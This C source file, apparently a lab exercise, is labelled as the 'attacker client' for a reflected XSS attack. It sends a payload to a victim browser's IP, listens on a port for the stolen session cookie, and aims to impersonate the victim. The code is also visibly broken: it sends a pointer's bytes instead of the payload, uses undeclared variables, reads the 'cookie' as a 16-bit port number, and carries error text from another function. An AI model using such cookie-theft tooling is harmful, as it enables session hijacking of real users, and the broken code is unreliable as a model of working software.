// The reflected XSS server code (in C). Note that this is the “attacker client” code.
// 1) send the payload
// 2) get the cookie
// 3) act as the client!

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/mman.h>  // for mprotect()
#include <time.h>      // for time


#define WEB_BROWSER_IP "192.168.1.203"        
#define ATTACKER_CLIENT_IP "192.168.1.202"        
#define CLIENT_SERVER_PORT 12345 // this needs to be the port sent in the payload!!!s
#define WEB_BROWSER_PORT 8080


/// part 1: send the XSS payload to the victim's browser 
static int send_payload_to_browser(char *payload)
{
    int sock_fd;
    struct sockaddr_in client_addr;
    int attempt;
    printf("sending payload to browser...\n");
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr(WEB_BROWSER_IP);
    client_addr.sin_port = htons(WEB_BROWSER_PORT);

    /* try several times to avoid race if client is not yet listening */
    for (attempt = 0; attempt < 5; ++attempt) {
        sock_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (sock_fd < 0) {
            perror("socket");
            return 1;
        }

        if (connect(sock_fd,
                    (struct sockaddr *)&client_addr,
                    (socklen_t)sizeof(client_addr)) == 0) {
            /* connected successfully */
            ssize_t bytes_sent = send(sock_fd, &payload, sizeof(payload), 0);
            if (bytes_sent == -1) {
                perror("send");
                close(sock_fd);
                return 1;
            } else if ((size_t)bytes_sent != sizeof(payload)) {
                fprintf(stderr,
                        "Partial send: %zd of %zu bytes\n",
                        bytes_sent, sizeof(payload));
                close(sock_fd);
                return 1;
            }
            close(sock_fd);
            return 0;
        }

        /* connect failed, retry after short sleep */
        close(sock_fd);
        sleep(1);
    }

    fprintf(stderr,
            "send_port_to_client: failed to connect to attacker-client after retries\n");
    return 1;
}


/// part 2: get the cookie from the web browser (attacker's client!) using TCP 
uint16_t get_user_cookie()
{
    printf("Client: waiting to receive user cookie from browser...\n");
    struct sockaddr_in servaddr, cli;

    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(EXIT_ERROR);
    }
    else
        printf("Socket successfully created..\n");

    // Set the SO_REUSEADDR and SO_REUSEPORT options on the socket
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sockfd);
        exit(EXIT_ERROR);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sockfd);
        exit(EXIT_ERROR);
    }

    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY); // WARNING: this might be changed to the browser IP!!!
    servaddr.sin_port = htons(12345);

    // Binding newly created socket to given IP and verification
    int bind_attempts = 0;
    while (bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
        if (bind_attempts >= 3) {
            printf("socket bind failed...\n");
            close(sockfd);
            exit(EXIT_ERROR);
        }
        printf("socket bind failed, retrying...\n");
        sleep(5);
        bind_attempts++;
    }
    printf("Socket successfully binded..\n");

    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        close(sockfd);
        exit(EXIT_ERROR);
    }
    else
        printf("Client listening..\n");
    socklen_t len = sizeof(cli);

    // Accept the data packet from client and verification
    connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
    if (connfd < 0) {
        printf("Client accept failed...\n");
        close(sockfd);
        exit(EXIT_ERROR);
    }
    else
        printf("Client accept the client...\n");

    uint16_t resolver_port;
    ssize_t r = recv(connfd, &resolver_port, sizeof(resolver_port), MSG_WAITALL);
    if (r <= 0) {
        perror("recv() failed");
    } else {
        // unsigned short port = ntohs(resolver_port);
        printf("Received integer from server: %u\n", resolver_port);
    }

    // After chatting close the socket
    close(connfd); // Close the connection socket
    close(sockfd); // Close the listening socket

    return resolver_port;
}

